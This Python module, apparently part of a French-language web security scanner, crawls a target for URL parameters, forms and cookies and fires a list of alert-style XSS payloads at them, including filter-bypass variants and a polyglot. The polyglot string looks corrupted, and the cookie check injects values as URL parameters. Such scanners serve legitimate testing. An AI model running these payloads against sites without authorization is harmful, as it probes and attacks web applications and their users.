import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from pprint import pprint
from core.config import create_session, DEFAULT_TIMEOUT

# Payloads XSS pour tester la vulnérabilité
XSS_PAYLOADS = [
    # Basic script tags
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>prompt('XSS')</script>",
    "<script>confirm('XSS')</script>",

    # Event handlers
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=prompt('XSS')>",
    "<body onload=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<svg/onload=prompt('XSS')>",
    "<input type='text' onfocus=alert('XSS') autofocus>",
    "<a href='#' onmouseover=alert('XSS')>Hover me</a>",
    "<iframe onload=alert('XSS')></iframe>",
    "<details ontoggle=alert('XSS') open>",

    # Tag variations (case bypass)
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<IMG SRC=x onerror=alert('XSS')>",
    "<svg/OnLoAd=alert('XSS')>",

    # Encoding and obfuscation
    "javascript:alert('XSS')",
    "data:text/html,<script>alert('XSS')</script>",
    "';alert('XSS');//",
    "\"';alert('XSS');//",

    # Context-specific payloads
    "'><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "\"<script>alert(1)</script>",
    "</title><script>alert(1)</script>",
    "</style><script>alert(1)</script>",
    "</script><script>alert('XSS')</script>",

    # Input tag tricks
    "<input type='image' src='x' onerror='alert(\"XSS\")'>",
    "<input type='button' onclick='alert(\"XSS\")'>",

    # Iframe tricks
    "<iframe src='javascript:alert(\"XSS\");'></iframe>",
    "<iframe srcdoc='&lt;script&gt;alert(\"XSS\")&lt;/script&gt;'></iframe>",

    # SVG
    "<svg><image href='javascript:alert(\"XSS\")' /></svg>",

    # Polyglot payloads
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik%%0a1telerik1//</stYle/telerik</titLe/telerik</telerik</tExTarEa/telerik</ScRiPt/telerik--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
]


def find_xss_in_urls(target, session=None, timeout=DEFAULT_TIMEOUT):
    """Recherche des paramètres potentiellement vulnérables à XSS dans les URLs du site."""
    if not session:
        session = create_session()
    try:
        response = session.get(target, timeout=timeout)
        soup = BeautifulSoup(response.text, 'html.parser')

        detected_params = []
        for link in soup.find_all('a', href=True):
            url = link['href']
            if "?" in url and "=" in url:
                full_url = urljoin(target, url)
                parsed_url = urlparse(full_url)
                params = parsed_url.query.split("&")
                for param in params:
                    name = param.split("=")[0]
                    print(f"[~] Paramètre trouvé: {full_url} - {name}")
                    detected_params.append({"url": full_url, "param": name})

        return detected_params
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur lors de la recherche XSS dans les URLs : {e}")
        return []


def find_xss_in_forms(target, session=None, timeout=DEFAULT_TIMEOUT):
    """Recherche des formulaires pouvant être vulnérables à XSS."""
    print("[~] Recherche des formulaires...")
    if not session:
        session = create_session()
    try:
        response = session.get(target, timeout=timeout)
        soup = BeautifulSoup(response.text, 'html.parser')

        detected_forms = []
        for form in soup.find_all('form'):
            action = form.attrs.get("action", "").strip()
            method = form.attrs.get("method", "get").lower()
            inputs = {input_tag.attrs.get("name"): input_tag.attrs.get("value", "")
                      for input_tag in form.find_all("input") if input_tag.attrs.get("name")}

            full_action_url = urljoin(target, action) if action else target
            detected_forms.append({"action": full_action_url, "method": method, "inputs": inputs})
            print(f"[~] Formulaire trouvé: {full_action_url}")

        return detected_forms
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur lors de la recherche de formulaires : {e}")
        return []


def find_xss_in_cookies(target, session=None, timeout=DEFAULT_TIMEOUT):
    """Recherche des cookies susceptibles d'être vulnérables à XSS."""
    print("[~] Recherche des cookies...")
    if not session:
        session = create_session()
    try:
        response = session.get(target, timeout=timeout)
        cookies = response.cookies.get_dict()
        if cookies:
            print(f"[~] Cookies trouvés : {list(cookies.keys())}")
        return cookies
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur lors de la recherche de cookies : {e}")
        return {}


def test_xss(target_url, param, method="get", session=None, timeout=DEFAULT_TIMEOUT):
    """Teste l'injection de payloads XSS sur un paramètre donné."""
    if not session:
        session = create_session()
    for payload in XSS_PAYLOADS:
        test_url = f"{target_url}&{param}={payload}" if "?" in target_url else f"{target_url}?{param}={payload}"
        try:
            if method == "get":
                response = session.get(test_url, timeout=timeout)
            else:
                response = session.post(target_url, data={param: payload}, timeout=timeout)
            response_text = response.text.lower()
            if payload.lower() in response_text:
                print(f"[!!!] 🔥 XSS détectée sur {test_url} avec le payload : {payload}")
                return {"url": test_url, "payload": payload, "method": method}
        except requests.exceptions.RequestException:
            pass
    return None


def scan_xss(target, formated_target, session=None, timeout=DEFAULT_TIMEOUT):
    """Effectue un scan XSS sur le site."""
    print(f"\n\t==============Scan XSS sur -->{formated_target}<-- 🔍 ==============\n")
    if not session:
        session = create_session()
    results = {"urls": [], "forms": [], "cookies": []}

    # 1. Tester les XSS dans les URLs
    urls_with_params = find_xss_in_urls(target, session, timeout)
    if urls_with_params:
        print("[~] Test XSS sur les URLs...")
        for item in urls_with_params:
            result = test_xss(item["url"], item["param"], "get", session, timeout)
            if result:
                results["urls"].append(result)

    # 2. Tester les XSS dans les formulaires
    forms_with_inputs = find_xss_in_forms(target, session, timeout)
    if forms_with_inputs:
        print("\n[~] Test XSS sur les formulaires...")
        for form in forms_with_inputs:
            action = form["action"]
            method = form["method"]
            for input_name in form["inputs"]:
                result = test_xss(action, input_name, method, session, timeout)
                if result:
                    results["forms"].append(result)

    # 3. Tester les XSS dans les cookies
    cookies = find_xss_in_cookies(target, session, timeout)
    if cookies:
        print("\n[~] Test XSS sur les cookies...")
        for cookie_name in cookies:
            result = test_xss(target, cookie_name, "get", session, timeout)
            if result:
                results["cookies"].append(result)

    print("\n[+] Résultats du scan XSS :")
    pprint(results)
    print("\n✅ Scan XSS terminé.\n")
    return results
